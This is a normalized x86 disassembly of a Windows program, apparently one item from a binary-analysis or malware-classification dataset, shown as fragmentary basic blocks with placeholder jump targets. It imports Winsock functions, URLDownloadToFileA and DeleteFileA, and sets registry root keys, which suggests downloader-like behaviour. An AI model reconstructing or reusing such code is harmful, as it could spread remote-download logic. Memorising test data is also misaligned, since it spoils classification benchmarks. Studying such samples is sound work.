add esi 0x4
sar eax 0x8
cdq
sub eax edx
sar eax 0x1
inc eax
shl eax 0x8
mov [ esi - 0x4 ] eax
dec ecx
jne r-xdata
mov ecx [ esp + 0x1458 ]
xor ebp ebp
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edi [ esp + 0x18 ]
mov [ esp + ecx * 4 + 0x1c ] eax
mov eax [ esp + 0x14 ]
inc ebx
mov ecx [ esp + eax * 4 + 0x42c ]
mov [ esp + eax * 4 + 0xc3c ] ebx
mov eax [ esp + edi * 4 + 0x42c ]
mov [ esp + edi * 4 + 0xc3c ] ebx
mov edx ecx
mov edi eax
and edx 0xff
and edi 0xff
cmp edi edx
jle r-xdata
jge r-xdata
mov edi [ esp + 0x10 ]
mov edx [ esp + eax * 4 + 0x1c ]
mov edi [ esp + edi * 4 + 0x42c ]
cmp edi [ esp + edx * 4 + 0x42c ]
jl r-xdata
mov edx [ esp + eax * 4 + 0x20 ]
mov edi [ esp + eax * 4 + 0x1c ]
mov edx [ esp + edx * 4 + 0x42c ]
cmp edx [ esp + edi * 4 + 0x42c ]
jge r-xdata
and al 0x0
and cl 0x0
add eax ecx
inc edx
or eax edx
inc esi
mov ecx esi
add ebp 0x4
sar ecx 0x1
mov [ ebp ] ebx
mov [ esp + ebx * 4 + 0x42c ] eax
mov edi [ esp + ecx * 4 + 0x1c ]
mov [ esp + ebx * 4 + 0xc3c ] 0xffffffff
mov edx esi
cmp eax [ esp + edi * 4 + 0x42c ]
jge r-xdata
mov edx edi
mov edi [ esp + 0x10 ]
mov edx [ esp + eax * 4 + 0x1c ]
mov edi [ esp + edi * 4 + 0x42c ]
cmp edi [ esp + edx * 4 + 0x42c ]
jl r-xdata
mov edx [ esp + eax * 4 + 0x20 ]
mov edi [ esp + eax * 4 + 0x1c ]
mov edx [ esp + edx * 4 + 0x42c ]
cmp edx [ esp + edi * 4 + 0x42c ]
jge r-xdata
mov [ esp + ecx * 4 + 0x1c ] edx
mov ecx eax
jmp r-xdata
inc eax
cmp esi 0x1
mov [ esp + edx * 4 + 0x1c ] ebx
jg r-xdata
mov [ esp + edx * 4 + 0x1c ] edi
mov edx ecx
sar ecx 0x1
mov edi [ esp + ecx * 4 + 0x1c ]
cmp eax [ esp + edi * 4 + 0x42c ]
jl r-xdata
mov [ esp + ecx * 4 + 0x1c ] edx
mov ecx eax
jmp r-xdata
inc eax
lea eax [ ecx + ecx ]
cmp eax esi
jg r-xdata
mov eax [ esp + 0x20 ]
dec esi
mov [ esp + 0x18 ] eax
mov eax [ ebp ]
mov [ esp + 0x20 ] eax
sub ebp 0x4
mov ecx 0x1
mov [ esp + 0x10 ] eax
lea eax [ ecx + ecx ]
cmp eax esi
jg r-xdata
sub_415040
mov eax [ esp + 0x10 ]
push ebp
push esi
mov esi [ esp + 0x14 ]
xor ebp ebp
cmp esi eax
jg r-xdata
pop esi
pop ebp
retn
mov edx [ esp + 0x10 ]
push ebx
push edi
mov edi [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
shl ebp 0x1
inc esi
cmp esi eax
jle r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
test edi edi
jle r-xdata
pop edi
pop ebx
inc eax
add ecx 0x4
cmp eax edi
jl r-xdata
mov [ ecx ] ebp
inc ebp
xor ebx ebx
mov bl [ eax + edx ]
cmp ebx esi
jne r-xdata
sub_401020
mov al [ esp + 0x4 ]
retn 0x4
sub_401030
retn 0x8
sub_401040
mov eax [ esp + 0x4 ]
mov cl [ eax ]
push esi
mov esi [ esp + 0xc ]
mov dl [ esi ]
mov [ eax ] dl
mov [ esi ] cl
pop esi
retn 0x8
sub_401510
mov eax [ ecx - 0x14 ]
mov edx [ ecx - 0x10 ]
mov [ ecx - 0x24 ] eax
mov eax [ ecx - 0xc ]
mov [ ecx - 0x20 ] edx
mov edx [ ecx - 0x8 ]
mov [ ecx - 0x1c ] eax
mov [ ecx - 0x18 ] edx
add ecx 0xffffffd8
jmp sub_401390
sub_401840
mov eax [ esp + 0x8 ]
push eax
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x8 ]
push eax
add ecx 0x8
push ecx
call sub_4022a0
add esp 0xc
retn 0x8
sub_4018a0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
retn
j_sub_402280
jmp sub_402280
sub_402330
mov [ ecx ] rw-data
retn
sub_402340
xor al al
retn 0x4
sub_4024e0
mov eax ecx
xor ecx ecx
mov [ eax + 0x10 ] cl
mov [ eax + 0x11 ] ecx
retn
sub_402730
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
push eax
push 0x8
push ecx
call [ HeapAlloc@IAT ]
retn
sub_402750
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push 0x0
push ecx
call [ HeapFree@IAT ]
retn
sub_402770
mov eax [ ecx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ edx + ecx + 0x8 ]
lea ecx [ edx + ecx + 0x8 ]
mov edx [ eax ]
push 0x8
push rw-data
call edx
mov al 0x1
retn
sub_402790
mov eax [ ecx + 0x4 ]
push 0x0
push eax
call [ GetFileSize@IAT ]
retn
sub_4029b0
mov eax [ ecx + 0x4 ]
push eax
call [ CloseHandle@IAT ]
mov al 0x1
retn
sub_402ce0
mov eax [ esp + 0x4 ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0x6a09e667
mov [ eax + 0xc ] 0xbb67ae85
mov [ eax + 0x10 ] 0x3c6ef372
mov [ eax + 0x14 ] 0xa54ff53a
mov [ eax + 0x18 ] 0x510e527f
mov [ eax + 0x1c ] 0x9b05688c
mov [ eax + 0x20 ] 0x1f83d9ab
mov [ eax + 0x24 ] 0x5be0cd19
retn
sub_405da0
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
je r-xdata
retn
lea esp [ esp ]
add eax 0x1
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x30
cmp [ eax ] 0x20
jne r-xdata
sub_406091
add al 0x4
add al 0x1
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add ecx esp
int3
sub_4061c0
mov al [ esp + 0x4 ]
mov cl al
sub cl 0x61
cmp cl 0x19
ja r-xdata
sub al 0x41
cmp al 0x19
setbe al
retn
mov al 0x1
retn
sub_407d0d
push rw-data
call sub_401580
mov edx [ ebp - 0x14 ]
push eax
add edx 0xffffc304
push edx
call sub_4065a0
add esp 0xc
mov eax sub_407d30
retn
sub_407d78
push rw-data
call sub_401580
mov ecx [ ebp - 0x14 ]
push eax
add ecx 0xffffc304
push ecx
call sub_4065a0
add esp 0xc
mov eax sub_407d9b
retn
sub_407d9b
mov edi [ ebp - 0x14 ]
sub_407d9e
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x4
call sub_4071c0
jmp sub_407dd8
sub_407db2
push rw-data
call sub_401580
mov edx [ ebp - 0x14 ]
push eax
add edx 0xffffc304
push edx
call sub_4065a0
add esp 0xc
mov eax sub_407dd5
retn
sub_407dd5
mov edi [ ebp - 0x14 ]
sub_407e24
push rw-data
call sub_401580
mov ecx [ ebp - 0x14 ]
push eax
add ecx 0xffffc304
push ecx
call sub_4065a0
add esp 0xc
mov eax sub_407e47
retn
sub_407e47
mov edi [ ebp - 0x14 ]
sub_407ed0
push rw-data
call sub_401580
mov edx [ ebp - 0x14 ]
push eax
add edx 0xffffc304
push edx
call sub_4065a0
add esp 0xc
mov eax sub_407ef3
retn
sub_407ef3
mov edi [ ebp - 0x14 ]
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0xa
call sub_406b70
jmp sub_407f2f
sub_407f0a
push rw-data
call sub_401580
push eax
mov eax [ ebp - 0x14 ]
add eax 0xffffc304
push eax
call sub_4065a0
add esp 0xc
mov eax sub_407f2c
retn
sub_407f2c
mov edi [ ebp - 0x14 ]
sub_407f2f
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0xc
call sub_406630
jmp sub_407f69
sub_407f43
push rw-data
call sub_401580
mov ecx [ ebp - 0x14 ]
push eax
add ecx 0xffffc304
push ecx
call sub_4065a0
add esp 0xc
mov eax sub_407f66
retn
sub_407f66
mov edi [ ebp - 0x14 ]
sub_407fa8
push rw-data
call sub_401580
push eax
mov eax [ ebp - 0x14 ]
add eax 0xffffc304
push eax
call sub_4065a0
add esp 0xc
mov eax sub_407fca
retn
sub_407fca
mov edi [ ebp - 0x14 ]
sub_408017
push rw-data
call sub_401580
mov ecx [ ebp - 0x14 ]
push eax
add ecx 0xffffc304
push ecx
call sub_4065a0
add esp 0xc
mov eax sub_40803a
retn
sub_408087
push rw-data
call sub_401580
mov edx [ ebp - 0x14 ]
push eax
add edx 0xffffc304
push edx
call sub_4065a0
add esp 0xc
mov eax sub_4080aa
retn
sub_4080f7
push rw-data
call sub_401580
push eax
mov eax [ ebp - 0x14 ]
add eax 0xffffc304
push eax
call sub_4065a0
add esp 0xc
mov eax sub_408119
retn
sub_408166
push rw-data
call sub_401580
mov ecx [ ebp - 0x14 ]
push eax
add ecx 0xffffc304
push ecx
call sub_4065a0
add esp 0xc
mov eax sub_408189
retn
sub_408189
mov edi [ ebp - 0x14 ]
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x18
call sub_407bb0
jmp sub_4081c6
sub_4081a0
push rw-data
call sub_401580
mov edx [ ebp - 0x14 ]
push eax
add edx 0xffffc304
push edx
call sub_4065a0
add esp 0xc
mov eax sub_4081c3
retn
sub_4081c3
mov edi [ ebp - 0x14 ]
sub_408226
push rw-data
call sub_401580
push eax
mov eax [ ebp - 0x14 ]
add eax 0xffffc304
push eax
call sub_4065a0
add esp 0xc
mov eax sub_408248
retn
sub_408248
mov edi [ ebp - 0x14 ]
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x1c
call sub_4078c0
jmp sub_408285
sub_40825f
push rw-data
call sub_401580
mov ecx [ ebp - 0x14 ]
push eax
add ecx 0xffffc304
push ecx
call sub_4065a0
add esp 0xc
mov eax j_sub_408285
retn
j_sub_408285
mov edi [ ebp - 0x14 ]
sub_408285
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x1e
call sub_407330
jmp r-xdata
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x20
call sub_4067d0
jmp sub_4082f8
sub_408299
push rw-data
call sub_401580
mov edx [ ebp - 0x14 ]
push eax
add edx 0xffffc304
push edx
call sub_4065a0
add esp 0xc
mov eax sub_4082bc
retn
sub_4082bc
mov edi [ ebp - 0x14 ]
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x20
call sub_4067d0
jmp sub_4082f8
sub_4082d3
push rw-data
call sub_401580
push eax
mov eax [ ebp - 0x14 ]
add eax 0xffffc304
push eax
call sub_4065a0
add esp 0xc
mov eax sub_4082f5
retn
sub_4082f5
mov edi [ ebp - 0x14 ]
sub_4082f8
push rw-data
mov [ ebp - 0x4 ] 0x22
call sub_401580
add esp 0x4
push eax
push 0x80000002
lea ecx [ edi - 0x3cfc ]
call sub_4069b0
jmp sub_408345
sub_40831f
push rw-data
call sub_401580
mov ecx [ ebp - 0x14 ]
push eax
add ecx 0xffffc304
push ecx
call sub_4065a0
add esp 0xc
mov eax sub_408342
retn
sub_408342
mov edi [ ebp - 0x14 ]
sub_408345
push rw-data
mov [ ebp - 0x4 ] 0x24
call sub_401580
add esp 0x4
push eax
push 0x80000001
lea ecx [ edi - 0x3cfc ]
call sub_4069b0
jmp sub_408392
sub_40836c
push rw-data
call sub_401580
mov edx [ ebp - 0x14 ]
push eax
add edx 0xffffc304
push edx
call sub_4065a0
add esp 0xc
mov eax sub_40838f
retn
sub_40838f
mov edi [ ebp - 0x14 ]
sub_408392
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x26
call sub_407530
mov [ ebp - 0x4 ] 0xffffffff
jmp sub_4083d2
sub_4083ad
push rw-data
call sub_401580
push eax
mov eax [ ebp - 0x14 ]
add eax 0xffffc304
push eax
call sub_4065a0
add esp 0xc
mov eax sub_4083cf
retn
sub_4083cf
mov edi [ ebp - 0x14 ]
sub_408410
mov eax [ ecx + 0x4 ]
mov [ ecx ] rw-data
mov edx [ eax + 0x4 ]
mov [ edx + ecx + 0x4 ] rw-data
mov eax [ ecx + 0x4 ]
mov edx [ eax + 0x8 ]
mov [ edx + ecx + 0x4 ] rw-data
retn
sub_408440
retn 0x4
sub_4084b0
xor al al
retn
sub_408740
mov ecx [ esp + 0x4 ]
sub ecx [ ecx - 0x4 ]
mov [ esp + 0x4 ] ecx
jmp sub_40a380
sub_408750
mov ecx [ esp + 0x4 ]
sub ecx [ ecx - 0x4 ]
mov [ esp + 0x4 ] ecx
jmp sub_409750
sub_408760
sub ecx [ ecx - 0x4 ]
jmp sub_409720
sub_408b00
push esi
mov esi ecx
call sub_408670
mov [ esi + 0x4768 ] rw-data
lea ecx [ esi + 0x470c ]
pop esi
jmp sub_402720
sub_408ef0
sub ecx 0x10c
jmp sub_401160
sub_408f00
sub ecx 0x10c
jmp sub_401120
sub_408f10
mov ecx [ esp + 0x4 ]
sub ecx [ ecx - 0x4 ]
sub ecx 0x246
mov [ esp + 0x4 ] ecx
jmp sub_40a380
sub_408f30
mov ecx [ esp + 0x4 ]
sub ecx [ ecx - 0x4 ]
sub ecx 0x246
mov [ esp + 0x4 ] ecx
jmp sub_409750
sub_408f50
sub ecx [ ecx - 0x4 ]
sub ecx 0x246
jmp sub_409720
sub_408f60
sub ecx 0x10c
jmp sub_401060
sub_408f70
sub ecx 0x37e
jmp sub_407c30
sub_4090c0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov al 0x1
retn 0x4
push 0x0
push eax
add ecx 0x15
push ecx
call sub_4059c0
add esp 0xc
sub_409300
xor al al
retn 0x8
sub_409310
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov al 0x1
retn 0x4
push 0x0
push eax
add ecx 0x14
push ecx
call sub_4059c0
add esp 0xc
sub_409330
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
mov [ ecx + edx ] rw-data
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx + edx ] rw-data
retn
sub_4094c0
mov eax [ esp + 0x4 ]
push eax
call sub_405f60
add esp 0x4
retn 0x4
sub_40a150
add ecx 0x2a6
push ecx
call [ DeleteFileA@IAT ]
retn
sub_40a160
mov eax [ ecx - 0x11 ]
mov edx [ eax + 0x18 ]
lea eax [ edx + ecx - 0x11 ]
mov edx [ esp + 0x4 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x8 ]
call eax
add esp 0x8
retn 0x4
sub_40a5e0
lea eax [ ecx + 0x2a6 ]
push eax
add ecx 0x15
call sub_409e00
retn
Ordinal_WSOCK32_11
jmp [ Ordinal_WSOCK32_11@IAT ]
Ordinal_WSOCK32_52
jmp [ Ordinal_WSOCK32_52@IAT ]
Ordinal_WSOCK32_57
jmp [ Ordinal_WSOCK32_57@IAT ]
Ordinal_WSOCK32_116
jmp [ Ordinal_WSOCK32_116@IAT ]
Ordinal_WSOCK32_115
jmp [ Ordinal_WSOCK32_115@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
sub_40b11e
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov [ esi ] eax
call sub_40c2c9
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_40c2c9
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
retn
sub_40b3fb
and [ rw-data ] 0x0
call sub_40c414
mov [ rw-data ] eax
xor eax eax
retn
sub_40b40f
mov [ ecx ] rw-data
jmp sub_40c5d8
sub_40b41a
push esi
mov esi ecx
mov [ esi ] rw-data
call sub_40c5d8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_402280
pop ecx
sub_40b55e
push [ ebp - 0x14 ]
call sub_40b498
pop ecx
retn
sub_40b5a2
call sub_40c2c9
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_40c2c9
add eax 0x90
dec [ eax ]
sub_40b645
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40b64e
mov esp [ ebp - 0x18 ]
jmp sub_40c2e1
sub_40b6f4
push 0x4
mov eax sub_415286
call sub_40c8e6
call sub_40c2c9
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40c31a
call sub_40c32d
sub_40b7cd
mov eax [ ebp - 0x14 ]
call sub_40b5bd
retn
sub_40ba44
xor eax eax
inc eax
retn
sub_40ba48
mov esp [ ebp - 0x18 ]
jmp sub_40c2e1
sub_40badd
xor eax eax
inc eax
retn
sub_40bae1
mov esp [ ebp - 0x18 ]
jmp sub_40c2e1
sub_40bf9d
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_40c580
mov [ esi ] rw-data
mov eax esi
pop esi
retn 0x4
sub_40c0fc
push 0x0
call sub_40c099
pop ecx
retn
sub_40c168
push [ rw-data ]
call [ TlsGetValue@IAT ]
test eax eax
jne r-xdata
retn
push [ rw-data ]
call sub_40c105
pop ecx
push eax
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_40c23d
push 0xc
call sub_40cce5
pop ecx
retn
sub_40c2e1
push 0x8
push r--data
call sub_40c6e8
call sub_40c2c9
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40dae4
and [ ebp - 0x4 ] 0x0
call eax
jmp sub_40c308
sub_40c308
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40dae4
sub_40c31a
call sub_40c2c9
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_40c2e1
call eax
sub_40c351
xor eax eax
inc eax
retn
sub_40c3bc
and [ rw-data ] 0x0
retn
sub_40c3c4
push 0xc
push r--data
call sub_40c6e8
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_40c72d
retn
sub_40c3e1
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_40c474
call sub_40c414
mov [ rw-data ] eax
xor eax eax
retn
sub_40c4ed
push sub_40c481
call [ SetUnhandledExceptionFilter@IAT ]
push eax
call sub_40c099
mov [ rw-data ] eax
pop ecx
mov [ rw-data ] 0x1
xor eax eax
retn
sub_40c50e
cmp [ rw-data ] 0x0
je r-xdata
retn
push [ rw-data ]
call sub_40c105
pop ecx
push eax
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] 0x0
sub_40c5d8
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] rw-data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_40d805
pop ecx
sub_40c5ee
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax rw-data
sub_40c5fb
push esi
mov esi ecx
call sub_40c5d8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_402280
pop ecx
sub_40c617
push ecx
mov [ ecx ] rw-data
call sub_40df1b
pop ecx
retn
sub_40c625
push esi
mov esi ecx
call sub_40c617
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_402280
pop ecx
sub_40c641
mov eax [ esp + 0x4 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_40c660
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
retn 0x4
sub_40c72d
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40c966
xor eax eax
inc eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
retn
xor eax eax
sub_40cce5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40cdb4
push 0xa
call sub_40cce5
pop ecx
retn
sub_40d0e8
push 0xc
call sub_40cce5
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_40d39d
push 0xd
call sub_40cce5
pop ecx
retn
sub_40d7ae
push 0xd
call sub_40cce5
pop ecx
retn
sub_40d7e7
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40d64d
pop ecx
mov [ rw-data ] 0x1
sub_40d85b
push 0x4
call sub_40cce5
pop ecx
retn
sub_40d91b
call sub_40e5eb
push [ esp + 0x4 ]
call sub_40e44b
push [ rw-data ]
call sub_40c105
push 0xff
call eax
add esp 0xc
retn
sub_40d93f
push rw-data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
retn
push rw-data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call eax
sub_40d965
push [ esp + 0x4 ]
call sub_40d93f
pop ecx
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
sub_40dabe
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_40cce5
pop ecx
sub_40dad3
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_40da05
add esp 0xc
retn
sub_40dcc1
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40dbf8
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40dd0c
call eax
retn
sub_40ddba
push 0x4
call sub_40cce5
pop ecx
retn
sub_40df82
push 0xe
call sub_40cce5
pop ecx
retn
sub_40e062
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_40df8c
add esp 0xc
pop ebp
retn 0x4
sub_40e0c8
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_40df8c
add esp 0xc
pop ebp
retn 0x8
sub_40e198
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
xor ecx ecx
cmp eax 0xc0000005
sete cl
mov eax ecx
retn
sub_40e328
push [ esp + 0x4 ]
call [ InitializeCriticalSection@IAT ]
xor eax eax
inc eax
retn 0x8
sub_40e3be
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_40e3d5
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x24 ] 0xc0000017
jne r-xdata
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40c72d
retn
push 0x8
call [ SetLastError@IAT ]
sub_40fd89
push 0x4
call sub_40cce5
pop ecx
retn
sub_40fe0e
push [ rw-data ]
call sub_40c105
pop ecx
retn
sub_40ff8f
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_40cce5
pop ecx
sub_410210
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40ad70
sub_410226
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40ad70
sub_41023c
push 0xa
push 0x0
push [ esp + 0xc ]
call sub_41074f
add esp 0xc
retn
sub_410446
push 0x2
call sub_40d91b
pop ecx
retn
sub_4108a0
lea eax [ edx - 0x1 ]
pop ebx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_410b50
mov eax 0x1
retn
sub_410b60
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
push eax
call sub_40ddc3
add esp 0x4
retn
sub_410b80
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
retn
push eax
call sub_40d805
pop ecx
sub_410bd0
mov eax [ esp + 0x4 ]
mov [ eax + 0x34 ] 0x100
mov [ eax + 0x38 ] 0x0
retn
sub_410ea0
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x34 ] 0x100
jae r-xdata
push esi
call sub_410bd0
add esp 0x4
pop esi
retn
push esi
call sub_410ed0
add esp 0x4
sub_4112c0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x25c ] ecx
mov [ eax + 0x258 ] ecx
retn
sub_411580
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
and eax 0xff
push eax
push 0x8
push ecx
call sub_4114a0
add esp 0xc
retn
sub_415090
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_40acd2
mov ecx [ edx + 0x168 ]
xor ecx eax
call sub_40acd2
mov eax r--data
jmp sub_40aed3
sub_4150c0
mov ecx [ ebp - 0x10 ]
jmp sub_408620
sub_4150c8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_40acd2
mov eax r--data
jmp sub_40aed3
sub_4150f0
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
add ecx 0x7f2
jmp sub_402720
sub_41510f
mov eax [ ebp - 0x14 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffd
mov ecx [ ebp - 0x10 ]
add ecx 0x84a
jmp sub_402330
sub_41512e
mov ecx [ ebp - 0x10 ]
add ecx 0x15
jmp sub_408450
sub_415139
mov ecx [ ebp - 0x10 ]
add ecx 0x129
jmp sub_408410
sub_415147
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x18 ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40acd2
mov eax r--data
jmp sub_40aed3
sub_415170
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
add ecx 0x470c
jmp sub_402720
sub_41518f
mov eax [ ebp - 0x14 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffd
mov ecx [ ebp - 0x10 ]
add ecx 0x4768
jmp sub_402330
sub_4151ae
mov ecx [ ebp - 0x10 ]
jmp sub_408620
sub_4151b6
mov ecx [ ebp - 0x10 ]
add ecx 0x43e2
jmp sub_4084c0
sub_4151c4
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40acd2
mov eax r--data
jmp sub_40aed3
sub_4151e0
lea ecx [ ebp - 0x487c ]
jmp sub_408b00
sub_4151eb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4870 ]
mov ecx [ edx - 0x4874 ]
xor ecx eax
call sub_40acd2
add eax 0x0
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40acd2
mov eax r--data
jmp sub_40aed3
sub_415220
mov eax [ ebp - 0x14 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffd
mov ecx [ ebp - 0x10 ]
add ecx 0x140
jmp sub_402330
sub_41523f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40acd2
mov eax r--data
jmp sub_40aed3
sub_415260
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_409330
sub_41526b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40acd2
mov eax r--data
jmp sub_40aed3
sub_415286
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40acd2
mov eax r--data
jmp sub_40aed3
